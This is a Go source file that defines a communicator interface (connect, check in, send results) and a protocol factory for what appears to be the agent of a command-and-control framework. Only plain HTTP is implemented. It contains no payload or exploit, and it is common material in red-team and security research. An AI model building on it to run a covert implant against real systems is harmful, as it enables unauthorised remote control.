package comm

import (
	"errors"
	"fmt"
	"numinon_shadow/internal/agent/config"
)

type Communicator interface {
	Connect() error
	Disconnect() error
	CheckIn() ([]byte, error)
	SendResult(resultData []byte) error
	Type() config.AgentProtocol
}

func NewCommunicator(cfg config.AgentConfig) (Communicator, error) {

	switch cfg.Protocol {

	case config.HTTP1Clear:
		return NewHttp1ClearCommunicator(cfg)

	case config.HTTP1TLS:
		return nil, errors.New("http1tls not yet supported")
		//return NewHTTP1TLSListener(config)

	case config.HTTP2TLS:

		return nil, errors.New("http2tls not yet supported")
		//return NewHTTP2TLSListener(config)

	case config.HTTP3:
		return nil, errors.New("http3 not yet supported")
		//return NewHTTP3Listener(config)

	case config.WebsocketClear:
		return nil, errors.New("websocket not yet supported")
		//return NewWSListener(config)

	case config.WebsocketSecure:
		return nil, errors.New("websocket tls not yet supported")
		//return NewWSSListener(config)

	default:
		return nil, fmt.Errorf("unknown communicator type specified: %s", cfg.Protocol)
	}

}
